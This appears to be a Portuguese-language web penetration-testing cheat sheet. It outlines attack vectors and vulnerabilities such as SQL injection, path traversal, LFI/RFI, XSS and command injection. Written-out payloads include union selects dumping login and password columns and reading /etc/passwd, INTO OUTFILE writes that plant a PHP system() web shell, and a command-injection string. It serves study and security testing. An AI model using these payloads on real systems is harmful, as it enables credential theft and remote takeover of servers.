# Checklist
Directories

Files

Accepted Methods

Source Code

# Vetores de Ataque
Campos de busca

Campos de Login/Autenticação

Campos de Registro/Cadastro

Redirecionamentos

Parâmetros GET e POST

Download/Upload

Posts

# Vulnerabilities
## Directory and files Bruteforce
Com diversas ferramentas, é possível encontrar diretórios e arquivos escondidos no host através de bruteforce

## Method Bypass
É possível ver o conteúdo de uma página que é necessário acesso administrativo utilizando outro método para acessar. Exemplo: Fazer uma requisição POST via curl para a página específicada

## Source Code Analysis
É possível encontrar informações confidenciais através do código fonte da página e das suas subpáginas

## Open Redirect
Em casos que o redirecionamento é feito pelo parâmetro GET e seja passível de mudar a URL, o hacker pode alterar o link para um site malicioso ou para o que ele desejar. Algumas vezes, o parâmetro de redirecionamento está codificado em base64, MD5, etc. , mas isso também é possível burlar descobrindo a codificação e colocando no parâmetro o link codificado

## SQL Injection
Para testar se existe um SQL Injection, um método é colocar o contrabarra ou uma aspa simples em campos de input

### Information Schema
Através do information Schema, é possível obter a tabela com usuários e senhas do sistema e obter as informações contidas nela.

Exemplo: ' union select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema = "string" %23

Exemplo: ' union select 1,2,concat(login,':',senha),4,5 from table %23

### Error Based
O Error Based, como o próprio nome diz, é baseado nos erro que retorna ao tentar fazer uma consulta no banco de dados em algum campo. Com ele, é possível injetar códigos SQL para descobrir informações sobre a tabela e o banco de dados.

Exemplo: ' union select 1,2,3... %23'

Exemplo: ' order by 1 or 2 or 3...'

Exemplo: union select 1, column_name, load_file(”/etc/passwd”), 4, from information_schema.columns where table_schema=”database” and table_name=”users” %23

### Blind
Quando não se há indicações se existe um SQL Injection, pode se usar alguns testes  para verificar a lógica AND e OR do programa.

Exemplo: ' or 1=1 union select 1,2#

#### Blind Post
Para descobrir informações confidenciais do servidor através da lógica, é possível utilizar-se da função ascii para descobrir o nome da base de dados em que a aplicações está, por isso é muito comum usar o Burp Suite no modo Repeater para fazer as requisições.

Exemplo: ' or length(database()) = 7 #

Exemplo: ' or ascii(substring(database(),1,1)) = ascii number for letter # 

Exemplo: ' or database() = char(115,116,114,105,110,103) # 

Exempo: ' or ascii(substring(select loing from column name limit 0,1),1,1)) = ascii number for letter #

#### SQLi to RCE
Com a injeção de comandos SQL, é possível escrever dados no servidor com o comando INTO OUTFILE e o caminho do diretório que você deseja salvar.

Exemplo: ‘ union all select 1,2,3,4, “string” INTO OUTFILE “/var/www/html/website/file.txt” %23

Exemplo: ‘ union all select 1,2,3,4, “<?php system($_GET[’parameter’]); ?>” INTO OUTFILE “/var/www/html/website/banners/file.php” %23

### Time Based
O Time Based utiliza a função sleep() para verificar se existe uma vulnerabilidade de SQL Injection observando se a página demora para responder após enviar um sleep() em uma requisição ao banco de dados. Caso seja possível, pode-se utilizar o if para verificar informações sobre o banco de dados, tabelas e outras informações como nas outras vulnerabilidades

Exemplo: ' or sleep(5)#
Exemplo: ' or if (length(database()) = 5, sleep(5), 0)#
Exemplo: ' or if (database() = char(char(115,116,114,105,110,103)), sleep(5), 0)#
Exemplo: ' or if (ascii(substring(database(), 1, 1)) = 100, sleep(5), 0)#

### Bypass addslashes
Em alguns casos, por causa do jeito em que foi programado a consultado no banco de dados, vai adicionar algumas contrabarras na consulta, impossibilitando de fazer consultas com aspas simples, gerando um erro. Porém, umas das formas de burlar esse mecanismos, é passar os valores da string em decimal separados por vírgulas com a função char().

Exemplo: echo -n “string” | od -An -tdC

Exemplo:-1 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=char(115,116,114,105,110,103)

Site: [https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html)

## Full Path Disclosure | Path Traversal | Directory Traversal
O Path Traversal ou Directory Traversal é uma vulnerabilidade que ocorre quando é se é possível navegar entre os diretórios através de um parâmetro GET pela URL utilizando o "../" para listar todos os diretórios anteriores. Através dessa vulnerabilidade é possível encontrar arquivos sensíveis que se colocados na URL pode-se ver o conteúdo deles e encontrar informações confidenciais
## Local File Inclusion (LFI)
O Local File Inclusion ocorre quando o usuário consegue incluir e executar arquivos locais no servidor, manipulando os parâmetros da solicitação para incluir arquivos maliciosos no código da aplicação. Em códigos que adicionam uma extensão de arquivo ao final da solicitação, é possível burlar utilizando a adição de um nullbyte (%00) ao final da solicitação.

### Remote Code Execution através de LFI
É possível a injeção de código remoto através dos arquivo logs do servidor caso o servidor interprete o código passado para o log.  No exemplo a seguir, o código chama a função system e pelo parâmetro GET, executa o código passado por parâmetro remotamente no servidor.
Exemplo de código PHP: <?php system($_GET['parammeter']); ?>
## Remote File Inclusion (RFI)
O Remote File Inclusion ocorre quando o servidor executa códigos remotamente de outro servidor, assim, é possível subir um servidor e enviar um código malicioso para o servidor, para executar códigos remotamente através de um parâmetro, assim como no RCE através de LFI
## HTML Injection
O HTML Injection ocorre quando se é possível injetar códigos HTML na página


## Cross Site Scripting (XSS)
### Refletido
Utilizando o mesmo conceito do HTML Injection, é possível também injetar códigos javascript no servidor para executar códigos no servidor. O XSS Refletido se dá por que o atacante cria uma URL maliciosa e precisa enviar para uma vítima, não é feito nenhuma gravação no banco de dados da página

### Stored 
Quando o XSS é armazenado em algum lugar, por exemplo os comentários de feedback,  e com isso, é possível roubar os cookies de outros usuários enviando eles para o próprio servidor 

### XSStrike
O XSStrike é uma ferramenta para automatizar os testes de XSS em um host
Para utilizar ele basta utilizar o comando `python3 xsstrike.py -u "host?parameter="` ou `python3 xsstrike.py -u "host" --params` para XSS Refletido e o comando `python3 xsstrike.py -u "host/" --path` para Self XSS
Link para o download da ferramenta: https://github.com/s0md3v/XSStrike

## URL Encode
URL encoding converts characters into a format that can be transmitted over the Internet.

URLs can only be sent over the Internet using the [ASCII character-set](https://www.w3schools.com/charsets/ref_html_ascii.asp).

Since URLs often contain characters outside the ASCII set, the URL has to be converted into a valid ASCII format.

URL encoding replaces unsafe ASCII characters with a "%" followed by two hexadecimal digits.  

URLs cannot contain spaces. URL encoding normally replaces a space with a plus (+) sign or with %20.

Site for more informations about: https://www.w3schools.com/tags/ref_urlencode.ASP


## Command Injection
Essa vulnerabilidade se dá quando é possível injetar comandos do sistema operacional que não deveriam ser possíveis  através de algum campo .

Exemplo de código vulnerável: whois <url> | grep "nserver"

Exemplo de injeção de comando: whois ; id;# | grep "nserver"
